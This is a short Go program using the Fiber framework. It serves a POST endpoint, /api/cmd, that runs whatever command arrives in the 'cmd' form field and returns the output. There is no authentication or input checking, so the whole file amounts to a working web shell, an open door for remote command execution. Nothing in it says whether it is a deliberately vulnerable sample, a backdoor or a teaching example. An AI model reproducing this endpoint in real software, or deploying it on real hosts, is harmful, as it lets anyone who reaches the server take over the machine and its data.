package main

import (
    "github.com/gofiber/fiber/v2"
    "os/exec"
)

func main() {
    app := fiber.New()

    app.Post("/api/cmd", postHandler)

    app.Listen(":5000")
}


func postHandler(c *fiber.Ctx) error {
	
	cmd := c.FormValue("cmd")
	out, err := exec.Command(cmd).Output()
	if err != nil {
		return c.SendString(err.Error())
	}
	return c.SendString(string(out))
}

